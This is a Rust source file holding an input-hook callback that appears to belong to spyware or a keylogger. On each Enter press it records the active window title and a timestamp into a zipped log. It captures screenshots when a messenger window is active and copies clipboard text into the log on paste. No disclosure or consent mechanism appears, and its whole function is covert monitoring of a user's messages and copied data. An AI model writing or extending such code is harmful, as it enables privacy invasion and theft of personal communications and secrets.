use arboard::Clipboard;
use active_win_pos_rs::get_active_window;
use chrono::{Utc, DateTime};
use rdev::{Event, EventType, Button};

use crate::{zip_screenshot, zip_text, is_messengers};
use crate::{LOG_FILE, LOGGED};

pub fn callback(event: Event) {
    match event.event_type {
        EventType::KeyPress(_) => {
            match event.name {
                Some(string) => {
                    match string.as_str() {
                        "\r" => {
                            println!("return pressed");
                            let now = Utc::now();
                            let x: String = format!("{}", now);
                            let now_parsed: DateTime<Utc> = x.parse().unwrap();

                            match get_active_window() {
                                Ok(active_window) => {
                                    let info: String = format!("==={}|{}\n", active_window.title, now_parsed.to_string());
                                    *LOG_FILE.lock().unwrap() += &info;
                                    let logs = LOG_FILE.lock().unwrap().clone();

                                    match zip_text(logs) {
                                        Ok(_) => {
                                            *LOGGED.lock().unwrap() = true;
                                            println!("text written to logs.")
                                        },
                                        Err(e) => println!("Error: {e:?}"),
                                    };

                                    if is_messengers(active_window.title) {
                                        match zip_screenshot() {
                                            Ok(..) => println!("success to zip screenshot."),
                                            Err(..) => println!("failed to zip screenshot.")
                                        }
                                    }
                                },
                                Err(()) => {
                                    println!("error occurred while getting the active window");
                                }
                            }
                        },
                        "\u{3}" => {
                            println!("copy pressed");
                        },
                        "\u{16}" => {
                            println!("paste pressed");
                            let mut clipboard = Clipboard::new().unwrap();
                            *LOG_FILE.lock().unwrap() += &clipboard.get_text().unwrap();
                            // let the_string = "Hello, world!";
                            // clipboard.set_text(the_string).unwrap();
                            // println!("But now the clipboard text should be: \"{}\"", the_string);
                        },
                        "\u{13}" => {
                            println!("save pressed");
                        },
                        "\u{8}" => {
                            println!("backspace pressed");
                        },
                        "\u{18}" => {
                            println!("cut pressed");
                        },
                        "\t" => {
                            println!("tab pressed");
                        },
                        _ => {
                            let x = format!("{}", string);
                            println!("{}", x);
                        }
                    }
                },
                None => (),
            }
        },
        EventType::ButtonPress(button) => match button {
            Button::Left => {
                println!("User clicked mouse left button");
            },
            Button::Right => {

            },
            _ => {}
        }
        _ => {

        }
    }
}